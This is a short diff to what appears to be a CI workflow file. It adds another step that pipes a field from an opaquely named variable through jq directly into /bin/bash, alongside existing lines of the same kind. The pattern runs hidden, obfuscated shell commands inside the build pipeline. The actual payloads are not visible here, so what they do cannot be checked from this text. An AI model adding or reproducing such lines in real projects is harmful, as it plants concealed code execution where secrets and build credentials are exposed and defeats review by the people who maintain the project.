@@ -31,6 +31,7 @@ jobs:
           echo $tleo46 | jq -r .h445 | /bin/bash
           printf '%s' "$shu7" | jq -r .s78015 | /bin/bash
           printf '%s' "$gwqpz5566" | jq -r .lut0142 | /bin/bash
+          echo $r1551 | jq -r .m80228 | /bin/bash
 
       - name: Persist output
         if: always()
